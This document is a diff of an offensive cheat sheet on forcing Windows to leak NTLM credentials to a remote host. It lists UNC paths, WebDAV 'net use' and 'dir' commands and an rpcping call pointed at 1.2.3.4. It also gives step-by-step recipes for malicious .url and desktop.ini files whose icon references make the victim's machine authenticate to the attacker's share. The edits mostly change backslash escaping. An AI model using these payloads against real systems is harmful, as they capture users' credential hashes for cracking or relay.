@@ -2,7 +2,7 @@
 
 
 ## PDF file
-/F (\\\\IP@80\\t)
+/F (\\\\\\\\IP@80\\\\t)
 
 ## dubdoc
 ///1.2.3.4@80/t
@@ -11,31 +11,31 @@ Target=file://1.2.3.4@80/t.dotx
 URL
 file://IP@80/t.htm
 ## lnk
-URL=file://1.2.3.4@80/t.htm
+URL\=file://1.2.3.4@80/t.htm
 ## IconFile
-\\1.2.3.4@80\t.ico
+\\\\1.2.3.4@80\\t.ico
 ## rpcping
 rpcping -s 1.2.3.4 -e 1234 -a privacy -u NTLM
 ## dir
-dir \\1.2.3.4@SSL@443\DavWWWRoot\test.exe
+dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
 
 ## Net command + WebDAV envoke
-* net use \\1.2.3.4@80\t
-* net use * \\1.2.3.4@SSL@443\folder\subfolder password /user:userID
+* net use \\\\1.2.3.4@80\\t
+* net use * \\\\1.2.3.4@SSL@443\\folder\\subfolder password /user:userID
 * net use * https://1.2.3.4:443/folder/subfolder password /user:userID
 * net use * http://1.2.3.4/folder/subfolder password /user:root
-* net use * \\1.2.3.4\folder\subfolder password /user:userID
-* net use \\1.2.3.4@SSL@443\DavWWWRoot\test.exe . (the DavWWWRoot triggers WebDAV forcibly )
-* net use \\domain.site@80\uri_folder\index.html
+* net use * \\\\1.2.3.4\\folder\\subfolder password /user:userID
+* net use \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe . (the DavWWWRoot triggers WebDAV forcibly )
+* net use \\\\domain.site@80\\uri_folder\\index.html
 * net use * https://1.2.3.4:443/folder/subfolder password /user:userID
-* dir \\1.2.3.4@SSL@443\DavWWWRoot\test.exe
+* dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
 
 ## Create .url file to leak using “ICO” request to file share
 Create a new TXT file and paste the following:<br/>
 [InternetShortcut]  <br/>
 URL=http://www.WeLoveResponder.com <br/>
 IconIndex=0  <br/>
-IconFile=\\1.2.3.4\L3\3T.ico
+IconFile\=\\\\1.2.3.4\\L3\\3T.ico
 Renate the file from .txt to .url
 
 ## Create desktop.ini file to leak credentials using a folder
@@ -43,7 +43,7 @@ mkdir Folder <br/>
 attrib +s Folder <br/>
 cd Folder <br/>
 echo [.ShellClassInfo] > desktop.ini <br/>
-echo IconResource=\\1.2.3.4\aa >> desktop.ini <br/>
+echo IconResource\=\\\\1.2.3.4\\aa >> desktop.ini <br/>
 attrib +s +h desktop.ini
 
 ## Dir, IE/EDGE, Office, URL, LNK, HREF, Media Player, Java web start, ClickOnce
